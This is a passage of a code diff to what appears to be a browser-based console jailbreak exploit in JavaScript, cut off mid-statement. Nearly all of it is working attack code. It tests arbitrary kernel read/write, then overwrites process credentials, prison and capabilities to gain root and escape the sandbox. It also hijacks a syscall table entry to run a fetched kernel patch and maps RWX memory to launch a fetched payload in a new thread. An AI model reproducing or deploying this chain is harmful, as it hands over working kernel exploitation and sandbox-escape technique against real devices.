+              read82 = function (X) {
+                const lo = kread32(X),
+                  hi = kread32(X.add32(4));
+                return new int64(lo >>> 0, hi >>> 0);
+              },
+              write82 = function (X, V) {
+                kwrite32(X, V.low | 0);
+                kwrite32(X.add32(4), V.hi | 0);
+              };
             const kmAb = new ArrayBuffer(8);
             keepAlive2.push(kmAb);
-            const kmDv = new DataView(kmAb), kmAd = bufAddr(kmAb);
+            const kmDv = new DataView(kmAb),
+              kmAd = bufAddr(kmAb);
             const koAb = new ArrayBuffer(4);
             keepAlive2.push(koAb);
-            const koDv = new DataView(koAb), koAd = bufAddr(koAb);
+            const koDv = new DataView(koAb),
+              koAd = bufAddr(koAb);
             const knAb = new ArrayBuffer(4);
             keepAlive2.push(knAb);
-            const knDv = new DataView(knAb), knAd = bufAddr(knAb);
+            const knDv = new DataView(knAb),
+              knAd = bufAddr(knAb);
             const klAb = new ArrayBuffer(8);
             keepAlive2.push(klAb);
-            const klDv = new DataView(klAb), klAd = bufAddr(klAb);
+            const klDv = new DataView(klAb),
+              klAd = bufAddr(klAb);
             const t1 = kread32(A_OID.add32(16));
             mark("KRW-T1-READ32-IMG", "*(A_oid+0x10)=" + t1 + " want=27");
             check("krw-read32-image", t1 === 27, "got=" + t1);
@@ -4176,19 +5064,19 @@
             const t2ok = t2.low >>> 0 === 27 && t2.hi >>> 0 === 3221487618;
             mark(
               "KRW-T2-READ8-IMG",
-              "*(A_oid+0x10)=" + t2 + " want=lo:27 hi:0xc0040002"
+              "*(A_oid+0x10)=" + t2 + " want=lo:27 hi:0xc0040002",
             );
             check("krw-read8-image", t2ok, "got=" + t2);
             const uidNow = sc(SYS.getuid).i32 >>> 0;
             const t3 = kread32(UCRED.add32(4));
             mark(
               "KRW-T3-READ32-HEAP",
-              "*(ucred+0x04)=cr_uid=" + t3 + " getuid=" + uidNow
+              "*(ucred+0x04)=cr_uid=" + t3 + " getuid=" + uidNow,
             );
             check(
               "krw-read32-heap",
               t3 === uidNow,
-              "cr_uid=" + t3 + " getuid=" + uidNow
+              "cr_uid=" + t3 + " getuid=" + uidNow,
             );
             mark("KRW-T3B-READ8-HEAP", "read8(ucred)=" + read82(UCRED));
             const SCR4 = KBASE.add32(off.k_arg1_maxfiles);
@@ -4199,12 +5087,17 @@
             const b4 = kread32(SCR4);
             mark(
               "KRW-T4-WRITE32",
-              "orig=" + o4 + " wrote=0x41424344 readback=0x" + r4.toString(16) + " restored=" + b4
+              "orig=" +
+                o4 +
+                " wrote=0x41424344 readback=0x" +
+                r4.toString(16) +
+                " restored=" +
+                b4,
             );
             check(
               "krw-write32",
               r4 === 1094861636 && b4 === o4,
-              "readback=0x" + r4.toString(16) + " restored=" + b4
+              "readback=0x" + r4.toString(16) + " restored=" + b4,
             );
             const SCR8 = KBASE.add32(off.k_oid_maxfiles + 32);
             const o8 = read82(SCR8);
@@ -4213,58 +5106,109 @@
             const r8 = read82(SCR8);
             write82(SCR8, o8);
             const b8 = read82(SCR8);
-            const t5ok = r8.low >>> 0 === 3735928559 && r8.hi >>> 0 === 287454020 && b8.low >>> 0 === o8.low >>> 0 && b8.hi >>> 0 === o8.hi >>> 0;
+            const t5ok =
+              r8.low >>> 0 === 3735928559 &&
+              r8.hi >>> 0 === 287454020 &&
+              b8.low >>> 0 === o8.low >>> 0 &&
+              b8.hi >>> 0 === o8.hi >>> 0;
             mark(
               "KRW-T5-WRITE64",
-              "orig=" + o8 + " wrote=" + MAGIC8 + " readback=" + r8 + " restored=" + b8
+              "orig=" +
+                o8 +
+                " wrote=" +
+                MAGIC8 +
+                " readback=" +
+                r8 +
+                " restored=" +
+                b8,
             );
             check("krw-write64", t5ok, "readback=" + r8 + " restored=" + b8);
             mark(
               "KRW-VERDICT",
-              "fw=" + fwKey + " kernel_base=" + KBASE + " read32=" + (t1 === 27 ? 1 : 0) + " read8=" + (t2ok ? 1 : 0) + " heap=" + (t3 === uidNow ? 1 : 0) + " write32=" + (r4 === 1094861636 ? 1 : 0) + " write64=" + (t5ok ? 1 : 0) + " armings=" + armCount + "  ** full 64-bit arbitrary kernel R/W, syscall speed, 0 armings **"
+              "fw=" +
+                fwKey +
+                " kernel_base=" +
+                KBASE +
+                " read32=" +
+                (t1 === 27 ? 1 : 0) +
+                " read8=" +
+                (t2ok ? 1 : 0) +
+                " heap=" +
+                (t3 === uidNow ? 1 : 0) +
+                " write32=" +
+                (r4 === 1094861636 ? 1 : 0) +
+                " write64=" +
+                (t5ok ? 1 : 0) +
+                " armings=" +
+                armCount +
+                "  ** full 64-bit arbitrary kernel R/W, syscall speed, 0 armings **",
             );
             mark(
               "KRW-API",
-              "read8/write8/kread32/kwrite32 ready -- drop into the lapse/poops jailbreak stages (sysent hijack -> kpatch -> payload)"
+              "read8/write8/kread32/kwrite32 ready -- drop into the lapse/poops jailbreak stages (sysent hijack -> kpatch -> payload)",
             );
-            const krwOk = t1 === 27 && t2ok && t3 === uidNow && r4 === 1094861636 && t5ok;
+            const krwOk =
+              t1 === 27 && t2ok && t3 === uidNow && r4 === 1094861636 && t5ok;
             mark(
               "EG-GATE",
-              "krwOk=" + (krwOk ? 1 : 0) + " jb=" + (DO_JB ? 1 : 0) + " patch=" + (DO_PATCH ? 1 : 0) + " payload=" + (DO_PAYLOAD ? 1 : 0)
+              "krwOk=" +
+                (krwOk ? 1 : 0) +
+                " jb=" +
+                (DO_JB ? 1 : 0) +
+                " patch=" +
+                (DO_PATCH ? 1 : 0) +
+                " payload=" +
+                (DO_PAYLOAD ? 1 : 0),
             );
-            if (!check(
-              "eg-krw-ok",
-              krwOk,
-              "krwOk=" + (krwOk ? 1 : 0) + " (endgame needs all 5 KRW self-tests to pass)"
-            )) {
+            if (
+              !check(
+                "eg-krw-ok",
+                krwOk,
+                "krwOk=" +
+                  (krwOk ? 1 : 0) +
+                  " (endgame needs all 5 KRW self-tests to pass)",
+              )
+            ) {
               allDone = true;
             } else {
-              let kview = function(base) {
-                return {
-                  getBInt: (o) => read82(base.add32(o)),
-                  setBInt: (o, v) => write82(base.add32(o), v),
-                  getInt32: (o) => kread32(base.add32(o)) | 0,
-                  setInt32: (o, v) => {
-                    kwrite32(base.add32(o), v | 0);
+              let kview = function (base) {
+                  return {
+                    getBInt: (o) => read82(base.add32(o)),
+                    setBInt: (o, v) => write82(base.add32(o), v),
+                    getInt32: (o) => kread32(base.add32(o)) | 0,
+                    setInt32: (o, v) => {
+                      kwrite32(base.add32(o), v | 0);
+                    },
+                  };
+                },
+                findStub = function (num) {
+                  for (let o = 0; o < off.k_scan_stage1; o += 16) {
+                    const v = p.read8(libkernelBase.add32(o));
+                    if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73)
+                      continue;
+                    if (
+                      ((v.low >>> 24) | ((v.hi & 16777215) << 8)) >>> 0 ===
+                      num
+                    )
+                      return libkernelBase.add32(o);
                   }
+                  return null;
                 };
-              }, findStub = function(num) {
-                for (let o = 0; o < off.k_scan_stage1; o += 16) {
-                  const v = p.read8(libkernelBase.add32(o));
-                  if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73)
-                    continue;
-                  if ((v.low >>> 24 | (v.hi & 16777215) << 8) >>> 0 === num)
-                    return libkernelBase.add32(o);
-                }
-                return null;
-              };
-              const sameI64 = (a, b) => a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0;
+              const sameI64 = (a, b) =>
+                a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0;
               const kptr = (v) => !!v && v.hi >>> 0 >= 4294901760;
               const NEG1 = new int64(4294967295, 4294967295);
-              const stSetuid = findStub(23), stGeteuid = findStub(25), stOpen = findStub(5);
-              let jbDone = false, kpDone = false, plDone = false, jbUcred = null;
-              let jbSaved = null, jbRestored = false;
-              let kpatchBlob = null, payloadBlob = null;
+              const stSetuid = findStub(23),
+                stGeteuid = findStub(25),
+                stOpen = findStub(5);
+              let jbDone = false,
+                kpDone = false,
+                plDone = false,
+                jbUcred = null;
+              let jbSaved = null,
+                jbRestored = false;
+              let kpatchBlob = null,
+                payloadBlob = null;
               const SITES = [];
               if (DO_PATCH) {
                 try {
@@ -4274,11 +5218,11 @@
                   } else {
                     mark(
                       "KPATCH-FETCH-ERR",
-                      "HTTP " + r.status + " - File not found"
+                      "HTTP " + r.status + " - File not found",
                     );
                   }
                 } catch (e) {
-                  mark("KPATCH-FETCH-THREW", e && e.message || String(e));
+                  mark("KPATCH-FETCH-THREW", (e && e.message) || String(e));
                 }
                 if (kpatchBlob)
                   for (let i2 = 0; i2 + 7 <= kpatchBlob.length; i2++) {
@@ -4286,12 +5230,21 @@
                       continue;
                     if (kpatchBlob[i2 + 6] !== 235) continue;
                     SITES.push(
-                      (kpatchBlob[i2 + 2] | kpatchBlob[i2 + 3] << 8 | kpatchBlob[i2 + 4] << 16 | kpatchBlob[i2 + 5] << 24) >>> 0
+                      (kpatchBlob[i2 + 2] |
+                        (kpatchBlob[i2 + 3] << 8) |
+                        (kpatchBlob[i2 + 4] << 16) |
+                        (kpatchBlob[i2 + 5] << 24)) >>>
+                        0,
                     );
                   }
                 mark(
                   "KPATCH-BLOB",
-                  "file=" + KPATCH_FILE + " bytes=" + (kpatchBlob ? kpatchBlob.length : 0) + " sites=" + SITES.length
+                  "file=" +
+                    KPATCH_FILE +
+                    " bytes=" +
+                    (kpatchBlob ? kpatchBlob.length : 0) +
+                    " sites=" +
+                    SITES.length,
                 );
               }
               if (DO_PAYLOAD) {
@@ -4299,18 +5252,36 @@
                   const r = await fetch(PAYLOAD_FILE);
                   if (r.ok) payloadBlob = new Uint8Array(await r.arrayBuffer());
                 } catch (e) {
-                  mark("PAYLOAD-FETCH-THREW", e && e.message || String(e));
+                  mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e));
                 }
                 mark(
                   "PAYLOAD-BLOB",
-                  "file=" + PAYLOAD_FILE + " bytes=" + (payloadBlob ? payloadBlob.length : 0) + " head=" + (payloadBlob ? payloadBlob[0] === 233 ? "e9-ok" : "NOT-e9" : "none")
+                  "file=" +
+                    PAYLOAD_FILE +
+                    " bytes=" +
+                    (payloadBlob ? payloadBlob.length : 0) +
+                    " head=" +
+                    (payloadBlob
+                      ? payloadBlob[0] === 233
+                        ? "e9-ok"
+                        : "NOT-e9"
+                      : "none"),
                 );
               }
               if (DO_JB) {
-                const P_UCRED = 64, P_FD = 72, TD_PROC = 8;
-                const CR_UID = 4, CR_RUID = 8, CR_SVUID = 12, CR_NGROUPS = 16;
-                const CR_RGID = 20, CR_PRISON = 48, CR_SCECAPS1 = 96, CR_SCECAPS0 = 104;
-                const FD_RDIR = 16, FD_JDIR = 24;
+                const P_UCRED = 64,
+                  P_FD = 72,
+                  TD_PROC = 8;
+                const CR_UID = 4,
+                  CR_RUID = 8,
+                  CR_SVUID = 12,
+                  CR_NGROUPS = 16;
+                const CR_RGID = 20,
+                  CR_PRISON = 48,
+                  CR_SCECAPS1 = 96,
+                  CR_SCECAPS0 = 104;
+                const FD_RDIR = 16,
+                  FD_JDIR = 24;
                 const curproc = read82(CT1.add32(TD_PROC));
                 jbUcred = kptr(curproc) ? read82(curproc.add32(P_UCRED)) : null;
                 const pFd = kptr(curproc) ? read82(curproc.add32(P_FD)) : null;
@@ -4318,14 +5289,39 @@
                 const rootvn = read82(KBASE.add32(off.k_rootvnode));
                 mark(
                   "JB-SOURCES",
-                  "curproc=" + curproc + " ucred=" + jbUcred + " krwUcred=" + UCRED + " p_fd=" + pFd + " prison0=" + prison0 + " rootvnode=" + rootvn
+                  "curproc=" +
+                    curproc +
+                    " ucred=" +
+                    jbUcred +
+                    " krwUcred=" +
+                    UCRED +
+                    " p_fd=" +
+                    pFd +
+                    " prison0=" +
+                    prison0 +
+                    " rootvnode=" +
+                    rootvn,
                 );
-                const srcOk = kptr(curproc) && kptr(jbUcred) && kptr(pFd) && kptr(rootvn) && sameI64(jbUcred, UCRED);
-                if (check(
-                  "jb-sources-are-kernel-pointers",
-                  srcOk,
-                  "curproc=" + curproc + " ucred=" + jbUcred + " pfd=" + pFd + " rootvn=" + rootvn
-                )) {
+                const srcOk =
+                  kptr(curproc) &&
+                  kptr(jbUcred) &&
+                  kptr(pFd) &&
+                  kptr(rootvn) &&
+                  sameI64(jbUcred, UCRED);
+                if (
+                  check(
+                    "jb-sources-are-kernel-pointers",
+                    srcOk,
+                    "curproc=" +
+                      curproc +
+                      " ucred=" +
+                      jbUcred +
+                      " pfd=" +
+                      pFd +
+                      " rootvn=" +
+                      rootvn,
+                  )
+                ) {
                   const uidBefore = sc(SYS.getuid).i32;
                   const probePaths = ["/", "/system", "/mini-syscore.elf"];
                   const before = [];
@@ -4342,9 +5338,14 @@
                     }
                   mark(
                     "JB-PRECHECK",
-                    "getuid=" + uidBefore + " sandbox=[" + before.join(" ") + "]"
+                    "getuid=" +
+                      uidBefore +
+                      " sandbox=[" +
+                      before.join(" ") +
+                      "]",
                   );
-                  const U = kview(jbUcred), F = kview(pFd);
+                  const U = kview(jbUcred),
+                    F = kview(pFd);
                   jbSaved = {
                     U,
                     F,
@@ -4370,14 +5371,26 @@
                       CR_SCECAPS1,
                       CR_SCECAPS0,
                       FD_RDIR,
-                      FD_JDIR
-                    }
+                      FD_JDIR,
+                    },
                   };
                   mark(
                     "JB-SAVED",
-                    "prison=" + jbSaved.prison + " rdir=" + jbSaved.rdir + " jdir=" + jbSaved.jdir + " uid=" + jbSaved.uid + " caps=" + jbSaved.caps1 + "/" + jbSaved.caps0 + "  (refcounted handles -- restoring these is what keeps fdescfree/crfree balanced at process exit)"
+                    "prison=" +
+                      jbSaved.prison +
+                      " rdir=" +
+                      jbSaved.rdir +
+                      " jdir=" +
+                      jbSaved.jdir +
+                      " uid=" +
+                      jbSaved.uid +
+                      " caps=" +
+                      jbSaved.caps1 +
+                      "/" +
+                      jbSaved.caps0 +
+                      "  (refcounted handles -- restoring these is what keeps fdescfree/crfree balanced at process exit)",
                   );
-                  jbRestoreHook = function(why) {
+                  jbRestoreHook = function (why) {
                     if (jbRestored) return true;
                     F.setBInt(FD_RDIR, jbSaved.rdir);
                     F.setBInt(FD_JDIR, jbSaved.jdir);
@@ -4395,12 +5408,24 @@
                     const okAll = okRdir && okJdir && okPr;
                     mark(
                       "JB-RESTORE",
-                      why + " rdir=" + (okRdir ? 1 : 0) + " jdir=" + (okJdir ? 1 : 0) + " prison=" + (okPr ? 1 : 0) + " uid=" + sc(SYS.getuid).i32 + " -> " + (okAll ? "fdescfree/crfree are balanced again" : "NOT RESTORED -- reboot before closing the browser")
+                      why +
+                        " rdir=" +
+                        (okRdir ? 1 : 0) +
+                        " jdir=" +
+                        (okJdir ? 1 : 0) +
+                        " prison=" +
+                        (okPr ? 1 : 0) +
+                        " uid=" +
+                        sc(SYS.getuid).i32 +
+                        " -> " +
+                        (okAll
+                          ? "fdescfree/crfree are balanced again"
+                          : "NOT RESTORED -- reboot before closing the browser"),
                     );
                     check(
                       "JB-RESTORED-CLEAN",
                       okAll,
-                      "rdir/jdir/prison readback"
+                      "rdir/jdir/prison readback",
                     );
                     jbRestored = okAll;
                     return okAll;
@@ -4409,7 +5434,10 @@
                   const probeUid = sc(SYS.getuid).i32 >>> 0;
                   mark(
                     "JB-UCRED-PROBE",
-                    "wrote cr_uid=0x1337 getuid=0x" + probeUid.toString(16) + " match=" + (probeUid === 4919 ? 1 : 0)
+                    "wrote cr_uid=0x1337 getuid=0x" +
+                      probeUid.toString(16) +
+                      " match=" +
+                      (probeUid === 4919 ? 1 : 0),
                   );
                   U.setInt32(CR_UID, 0);
                   U.setInt32(CR_RUID, 0);
@@ -4423,10 +5451,16 @@
                   F.setBInt(FD_JDIR, rootvn);
                   mark(
                     "JB-CAPS-READBACK",
-                    "caps0=" + read82(jbUcred.add32(96)) + " caps1=" + read82(jbUcred.add32(104)) + " want=-1/-1"
+                    "caps0=" +
+                      read82(jbUcred.add32(96)) +
+                      " caps1=" +
+                      read82(jbUcred.add32(104)) +
+                      " want=-1/-1",
                   );
                   const uidNow2 = sc(SYS.getuid).i32;
-                  const euNow = stGeteuid ? callAddr(stGeteuid, []).i32 : uidNow2;
+                  const euNow = stGeteuid
+                    ? callAddr(stGeteuid, []).i32
+                    : uidNow2;
                   const suNow = stSetuid ? callAddr(stSetuid, [0]).i32 : 0;
                   const rbUid = U.getInt32(CR_UID);
                   const rbPrison = U.getBInt(CR_PRISON);
@@ -4449,37 +5483,70 @@
                           escaped = true;
                       }
                     }
-                  jbDone = uidNow2 === 0 && rbUid === 0 && sameI64(rbPrison, prison0) && sameI64(rbRdir, rootvn);
+                  jbDone =
+                    uidNow2 === 0 &&
+                    rbUid === 0 &&
+                    sameI64(rbPrison, prison0) &&
+                    sameI64(rbRdir, rootvn);
                   jailbroken = jbDone;
                   mark(
                     "JB-ROOT",
-                    "getuid=" + uidNow2 + " geteuid=" + euNow + " setuid0=" + suNow + " cr_uid=" + rbUid + " cr_prison=" + rbPrison + " fd_rdir=" + rbRdir + " sandbox_after=[" + after2.join(" ") + "] escaped=" + (escaped ? 1 : 0)
+                    "getuid=" +
+                      uidNow2 +
+                      " geteuid=" +
+                      euNow +
+                      " setuid0=" +
+                      suNow +
+                      " cr_uid=" +
+                      rbUid +
+                      " cr_prison=" +
+                      rbPrison +
+                      " fd_rdir=" +
+                      rbRdir +
+                      " sandbox_after=[" +
+                      after2.join(" ") +
+                      "] escaped=" +
+                      (escaped ? 1 : 0),
                   );
                   check(
                     "JB-ROOT-AND-ESCAPE",
                     jbDone,
-                    "getuid=" + uidNow2 + " cr_uid=" + rbUid
+                    "getuid=" + uidNow2 + " cr_uid=" + rbUid,
                   );
                 }
               }
               if (jbDone && DO_PATCH) {
-                const jitStub = findStub(533), kexecStub = findStub(661);
+                const jitStub = findStub(533),
+                  kexecStub = findStub(661);
                 mark(
                   "KPATCH-PRE",
-                  "sites=" + SITES.length + " jitStub=" + (jitStub ? 1 : 0) + " kexecStub=" + (kexecStub ? 1 : 0)
+                  "sites=" +
+                    SITES.length +
+                    " jitStub=" +
+                    (jitStub ? 1 : 0) +
+                    " kexecStub=" +
+                    (kexecStub ? 1 : 0),
                 );
-                if (check(
-                  "kpatch-preconditions",
-                  !!kpatchBlob && SITES.length >= 4 && !!jitStub && !!kexecStub,
-                  "blob/sites/stubs missing"
-                )) {
+                if (
+                  check(
+                    "kpatch-preconditions",
+                    !!kpatchBlob &&
+                      SITES.length >= 4 &&
+                      !!jitStub &&
+                      !!kexecStub,
+                    "blob/sites/stubs missing",
+                  )
+                ) {
                   if (jbUcred) {
                     write82(jbUcred.add32(96), NEG1);
                     write82(jbUcred.add32(104), NEG1);
                   }
                   mark(
                     "JIT-CRED",
-                    "caps1=" + (jbUcred ? read82(jbUcred.add32(104)) : "n/a") + " geteuid=" + (stGeteuid ? callAddr(stGeteuid, []).i32 : -1)
+                    "caps1=" +
+                      (jbUcred ? read82(jbUcred.add32(104)) : "n/a") +
+                      " geteuid=" +
+                      (stGeteuid ? callAddr(stGeteuid, []).i32 : -1),
                   );
                   const jitFd = callAddr(jitStub, [0, 16384, 7]).i32;
                   const jitErr = jitFd < 0 ? errno() : 0;
@@ -4487,22 +5554,40 @@
                   const mm = sc(SYS.mmap, KEXEC_MAP, 16384, 7, 17, jitFd, 0);
                   const mapAddr = new int64(mm.lo, mm.hi);
                   const mapErr = mm.i32 === -1 ? errno() : 0;
-                  const mapOk = jitFd >= 0 && mm.i32 !== -1 && sameI64(mapAddr, KEXEC_MAP);
+                  const mapOk =
+                    jitFd >= 0 && mm.i32 !== -1 && sameI64(mapAddr, KEXEC_MAP);
                   mark(
                     "KPATCH-MAP",
-                    "jitshm=" + jitFd + " jitErr=" + jitErr + " mmap=" + mapAddr + " mapErr=" + mapErr + " fixed=" + KEXEC_MAP
+                    "jitshm=" +
+                      jitFd +
+                      " jitErr=" +
+                      jitErr +
+                      " mmap=" +
+                      mapAddr +
+                      " mapErr=" +
+                      mapErr +
+                      " fixed=" +
+                      KEXEC_MAP,
                   );
-                  if (check(
-                    "kpatch-rwx-map",
-                    mapOk,
-                    "jitFd=" + jitFd + " jitErr=" + jitErr + " map=" + mapAddr
-                  )) {
+                  if (
+                    check(
+                      "kpatch-rwx-map",
+                      mapOk,
+                      "jitFd=" +
+                        jitFd +
+                        " jitErr=" +
+                        jitErr +
+                        " map=" +
+                        mapAddr,
+                    )
+                  ) {
                     for (let o = 0; o < kpatchBlob.length; o += 8) {
-                      let lo = 0, hi = 0;
+                      let lo = 0,
+                        hi = 0;
                       for (let k = 0; k < 4; k++)
-                        lo |= (kpatchBlob[o + k] || 0) << 8 * k;
+                        lo |= (kpatchBlob[o + k] || 0) << (8 * k);
                       for (let k = 0; k < 4; k++)
-                        hi |= (kpatchBlob[o + 4 + k] || 0) << 8 * k;
+                        hi |= (kpatchBlob[o + 4 + k] || 0) << (8 * k);
                       p.write8(mapAddr.add32(o), new int64(lo >>> 0, hi >>> 0));
                     }
                     let copied = true;
@@ -4511,7 +5596,10 @@
                         copied = false;
                     mark(
                       "KPATCH-COPY",
-                      "bytes=" + kpatchBlob.length + " copied=" + (copied ? 1 : 0)
+                      "bytes=" +
+                        kpatchBlob.length +
+                        " copied=" +
+                        (copied ? 1 : 0),
                     );
                     if (check("kpatch-blob-copied", copied, "")) {
                       const sysent = KBASE.add32(off.k_sysent_661);
@@ -4525,18 +5613,40 @@
                       let sitesOk = true;
                       for (const st of SITES) {
                         const b = read82(KBASE.add32(st)).low & 255;
-                        if (!(b >= 112 && b <= 127 || b === 235))
+                        if (!((b >= 112 && b <= 127) || b === 235))
                           sitesOk = false;
                       }
                       mark(
                         "SYSENT-SAVE",
-                        "narg=" + oNarg + " call=" + oCall + " thr=" + oThr + " gadget=" + gadget + "(ff26=" + (gadgetOk ? 1 : 0) + ") sitesOk=" + (sitesOk ? 1 : 0)
+                        "narg=" +
+                          oNarg +
+                          " call=" +
+                          oCall +
+                          " thr=" +
+                          oThr +
+                          " gadget=" +
+                          gadget +
+                          "(ff26=" +
+                          (gadgetOk ? 1 : 0) +
+                          ") sitesOk=" +
+                          (sitesOk ? 1 : 0),
                       );
-                      if (check(
-                        "kpatch-arm-gates",
-                        gadgetOk && kptr(oCall) && sitesOk && oNarg >= 0 && oNarg <= 8,
-                        "gadget=" + (gadgetOk ? 1 : 0) + " oCall_kptr=" + (kptr(oCall) ? 1 : 0) + " sites=" + (sitesOk ? 1 : 0)
-                      )) {
+                      if (
+                        check(
+                          "kpatch-arm-gates",
+                          gadgetOk &&
+                            kptr(oCall) &&
+                            sitesOk &&
+                            oNarg >= 0 &&
+                            oNarg <= 8,
+                          "gadget=" +
+                            (gadgetOk ? 1 : 0) +
+                            " oCall_kptr=" +
+                            (kptr(oCall) ? 1 : 0) +
+                            " sites=" +
+                            (sitesOk ? 1 : 0),
+                        )
+                      ) {
                         let rc = -1;
                         try {
                           SV.setInt32(0, 2);
@@ -4545,7 +5655,10 @@
                           const armed = sameI64(SV.getBInt(8), gadget);
                           mark(
                             "SYSENT-ARMED",
-                            "sy_call=" + SV.getBInt(8) + " ok=" + (armed ? 1 : 0)
+                            "sy_call=" +
+                              SV.getBInt(8) +
+                              " ok=" +
+                              (armed ? 1 : 0),
                           );
                           if (armed) rc = callAddr(kexecStub, [mapAddr]).i32;
                         } finally {
@@ -4557,44 +5670,70 @@
                         for (const st of SITES)
                           if ((read82(KBASE.add32(st)).low & 255) !== 235)
                             allEb = false;
-                        const restored = sameI64(SV.getBInt(8), oCall) && SV.getInt32(0) === oNarg && SV.getInt32(44) === oThr;
+                        const restored =
+                          sameI64(SV.getBInt(8), oCall) &&
+                          SV.getInt32(0) === oNarg &&
+                          SV.getInt32(44) === oThr;
                         kpDone = rc === 0 && allEb && restored;
                         kpatched = kpDone;
                         mark(
                           "KEXEC",
-                          "syscall(661)=" + rc + " sites_eb=" + (allEb ? 1 : 0) + " sysent_restored=" + (restored ? 1 : 0)
+                          "syscall(661)=" +
+                            rc +
+                            " sites_eb=" +
+                            (allEb ? 1 : 0) +
+                            " sysent_restored=" +
+                            (restored ? 1 : 0),
                         );
                         check(
                           "KERNEL-PATCHED",
                           kpDone,
-                          "rc=" + rc + " allEb=" + (allEb ? 1 : 0) + " restored=" + (restored ? 1 : 0)
+                          "rc=" +
+                            rc +
+                            " allEb=" +
+                            (allEb ? 1 : 0) +
+                            " restored=" +
+                            (restored ? 1 : 0),
                         );
                       }
                     }
                   }
                 }
               }
-              if (kpDone && DO_PAYLOAD && payloadBlob && payloadBlob[0] === 233) {
-                const sz = payloadBlob.length + 16383 & ~16383;
+              if (
+                kpDone &&
+                DO_PAYLOAD &&
+                payloadBlob &&
+                payloadBlob[0] === 233
+              ) {
+                const sz = (payloadBlob.length + 16383) & ~16383;
                 const m = sc(SYS.mmap, 0, sz, 7, 4098, -1, 0);
                 const entry = new int64(m.lo, m.hi);
                 const mErr = m.i32 === -1 ? errno() : 0;
                 const entryOk = m.i32 !== -1 && entry.hi >>> 0 > 0;
                 mark(
                   "PAYLOAD-MAP",
-                  "mmap(anon,rwx,0x" + sz.toString(16) + ")=" + entry + " err=" + mErr
+                  "mmap(anon,rwx,0x" +
+                    sz.toString(16) +
+                    ")=" +
+                    entry +
+                    " err=" +
+                    mErr,
                 );
-                if (check(
-                  "payload-rwx-map",
-                  entryOk,
-                  "map=" + entry + " err=" + mErr
-                )) {
+                if (
+                  check(
+                    "payload-rwx-map",
+                    entryOk,
+                    "map=" + entry + " err=" + mErr,
+                  )
+                ) {
                   for (let o = 0; o < payloadBlob.length; o += 8) {
-                    let lo = 0, hi = 0;
+                    let lo = 0,
+                      hi = 0;
                     for (let k = 0; k < 4; k++)
-                      lo |= (payloadBlob[o + k] || 0) << 8 * k;
+                      lo |= (payloadBlob[o + k] || 0) << (8 * k);
                     for (let k = 0; k < 4; k++)
-                      hi |= (payloadBlob[o + 4 + k] || 0) << 8 * k;
+                      hi |= (payloadBlob[o + 4 + k] || 0) << (8 * k);
                     p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
                   }
                   let bad2 = -1;
@@ -4602,13 +5741,22 @@
                     if (p.read1(entry.add32(o)) !== payloadBlob[o]) bad2 = o;
                   mark(
                     "PAYLOAD-COPY",
-                    "bytes=" + payloadBlob.length + (bad2 < 0 ? " ok" : " MISMATCH@0x" + bad2.toString(16))
+                    "bytes=" +
+                      payloadBlob.length +
+                      (bad2 < 0 ? " ok" : " MISMATCH@0x" + bad2.toString(16)),
                   );
                   const slot = webkitBase.add32(off.wk___imp_pthread_create);
                   const fn = p.read8(slot);
                   const expect = libkernelBase.add32(off.k_pthread_create);
                   mark("PTHREAD-RESOLVE", "got=" + fn + " expect=" + expect);
-                  if (bad2 < 0 && check("pthread-got-matches", sameI64(fn, expect), "got=" + fn)) {
+                  if (
+                    bad2 < 0 &&
+                    check(
+                      "pthread-got-matches",
+                      sameI64(fn, expect),
+                      "got=" + fn,
+                    )
+                  ) {
                     const thr = new ArrayBuffer(8);
                     keepAlive2.push(thr);
                     new Uint8Array(thr).fill(0);
@@ -4617,18 +5765,18 @@
                     const tdv = new DataView(thr);
                     const handle = new int64(
                       tdv.getUint32(0, true),
-                      tdv.getUint32(4, true)
+                      tdv.getUint32(4, true),
                     );
                     plDone = rc === 0 && handle.hi >>> 0 > 0;
                     payloadRunning = plDone;
                     mark(
                       "PAYLOAD-RUN",
-                      "pthread_create=" + rc + " handle=" + handle
+                      "pthread_create=" + rc + " handle=" + handle,
                     );
                     check(
                       "PAYLOAD-RUNNING",
                       plDone,
-                      "rc=" + rc + " handle=" + handle
+                      "rc=" + rc + " handle=" + handle,
                     );
                   }
                 }
@@ -4641,60 +5789,91 @@
                 const after2 = read82(TDU);
                 mark(
                   "JB-TDUCRED",
-                  "w1.td_ucred=" + before + " want=" + UCRED + " passB_restore_was_exact=" + (wasOk ? 1 : 0) + " repaired=" + (wasOk ? 0 : 1) + " now=" + after2
+                  "w1.td_ucred=" +
+                    before +
+                    " want=" +
+                    UCRED +
+                    " passB_restore_was_exact=" +
+                    (wasOk ? 1 : 0) +
+                    " repaired=" +
+                    (wasOk ? 0 : 1) +
+                    " now=" +
+                    after2,
                 );
                 check(
                   "JB-TDUCRED-CLEAN",
                   sameI64(after2, UCRED),
-                  "w1.td_ucred must equal the real ucred before this thread is torn down at process exit (crfree runs on it)"
+                  "w1.td_ucred must equal the real ucred before this thread is torn down at process exit (crfree runs on it)",
                 );
               } catch (e6) {
-                mark("JB-TDUCRED-THREW", e6 && e6.message || String(e6));
+                mark("JB-TDUCRED-THREW", (e6 && e6.message) || String(e6));
               }
               if (jbRestoreHook && !KEEP_JB) jbRestoreHook("end-of-run");
               else if (jbRestoreHook) {
                 mark(
                   "JB-KEEP",
-                  "?keepjb=1 -- jailbreak left LIVE. The handles will be restored on pagehide; if the browser is killed instead, REBOOT rather than closing it."
+                  "?keepjb=1 -- jailbreak left LIVE. The handles will be restored on pagehide; if the browser is killed instead, REBOOT rather than closing it.",
                 );
-                window.addEventListener("pagehide", function() {
+                window.addEventListener("pagehide", function () {
                   try {
                     jbRestoreHook("pagehide");
-                  } catch (e) {
-                  }
+                  } catch (e) {}
                 });
               }
               mark(
                 "EG-VERDICT",
-                "fw=" + fwKey + " kernel_base=" + KBASE + " jailbroken=" + (jbDone ? 1 : 0) + " kpatched=" + (kpDone ? 1 : 0) + " payload_running=" + (plDone ? 1 : 0) + " armings=" + armCount + " jb_restored=" + (jbRestored ? 1 : 0) + "  (.data/.text/caps need a reboot; the refcounted handles do not)"
+                "fw=" +
+                  fwKey +
+                  " kernel_base=" +
+                  KBASE +
+                  " jailbroken=" +
+                  (jbDone ? 1 : 0) +
+                  " kpatched=" +
